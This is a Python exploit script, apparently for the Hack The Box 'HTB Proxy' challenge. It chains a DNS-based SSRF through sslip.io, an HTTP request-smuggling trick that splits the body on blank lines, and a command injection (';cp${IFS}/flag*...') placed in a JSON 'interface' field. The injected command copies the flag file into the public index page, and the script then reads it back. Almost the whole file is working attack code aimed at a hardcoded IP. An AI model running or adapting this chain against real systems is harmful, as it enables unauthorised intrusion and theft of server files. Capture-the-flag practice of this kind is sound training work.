#!/usr/bin/env python3
"""HTB Proxy — DNS SSRF + CL=0 body-split smuggle → ip-wrapper CMDi."""
from __future__ import annotations

import argparse
import re
import socket
import sys
from pathlib import Path

FLAG_RE = re.compile(r"HTB\{[^}]+\}")


def http_raw(host: str, port: int, payload: bytes, timeout: float = 12.0) -> bytes:
    s = socket.create_connection((host, port), timeout=timeout)
    s.settimeout(timeout)
    s.sendall(payload)
    chunks = []
    try:
        while True:
            b = s.recv(4096)
            if not b:
                break
            chunks.append(b)
    except socket.timeout:
        pass
    finally:
        s.close()
    return b"".join(chunks)


def exploit(target: str, evidence: Path | None = None) -> str:
    assert target.startswith("http://")
    hp = target[len("http://") :].rstrip("/")
    ip, port_s = hp.rsplit(":", 1)
    port = int(port_s)

    st = http_raw(
        ip, port, b"GET /server-status HTTP/1.1\r\nHost: x:1\r\n\r\n"
    )
    m = re.search(rb"IPs:\s*([0-9.]+)", st)
    if not m:
        raise SystemExit(f"no IPs in /server-status: {st[:200]!r}")
    cip = m.group(1).decode()
    host = cip.replace(".", "-") + ".sslip.io:5000"

    inner_body = '{"interface":";cp${IFS}/flag*${IFS}/app/proxy/includes/index.html"}'
    smuggle = (
        f"POST /flushInterface HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: application/json\r\n"
        f"Content-Length: {len(inner_body)}\r\n"
        f"\r\n"
        f"{inner_body}"
    )
    # Split("\\r\\n\\r\\n"): bodySplit[1] must equal Content-Length.
    # "{}" + extra \\r\\n\\r\\n lets the 2nd request sit in bodySplit[2] (unchecked).
    first_body = "{}"
    outer = (
        f"POST /getAddresses HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: application/json\r\n"
        f"Content-Length: {len(first_body)}\r\n"
        f"Connection: keep-alive\r\n"
        f"\r\n"
        f"{first_body}\r\n"
        f"\r\n"
        f"{smuggle}"
    ).encode()
    if len(outer) > 1024:
        raise SystemExit(f"request too large for proxy buffer: {len(outer)}")

    smuggled = http_raw(ip, port, outer)
    if evidence:
        evidence.mkdir(parents=True, exist_ok=True)
        (evidence / "04_smuggle.txt").write_text(
            f"Q: smuggle /flushInterface?\nLEN={len(outer)} HOST={host}\n"
            + smuggled[:800].decode("latin1", "replace"),
            encoding="utf-8",
        )

    home = http_raw(ip, port, b"GET / HTTP/1.1\r\nHost: x:1\r\n\r\n")
    text = home.decode("utf-8", errors="replace")
    if evidence:
        (evidence / "05_index_after.txt").write_text(
            f"Q: GET / after cp /flag*?\n{text[:500]}", encoding="utf-8"
        )
    fm = FLAG_RE.search(text)
    if fm:
        return fm.group(0)
    # flag might be in the smuggled response (stdout leak)
    fm = FLAG_RE.search(smuggled.decode("latin1", "replace"))
    if fm:
        return fm.group(0)
    raise SystemExit(
        "no flag; smuggle[:200]="
        + repr(smuggled[:200])
        + " home[:120]="
        + repr(text[:120])
    )


def main() -> int:
    p = argparse.ArgumentParser()
    p.add_argument("--target", default="http://154.57.164.77:32208")
    p.add_argument(
        "--evidence",
        default=str(Path(__file__).resolve().parent / "evidence"),
    )
    args = p.parse_args()
    print(exploit(args.target, Path(args.evidence)))
    return 0


if __name__ == "__main__":
    sys.exit(main())
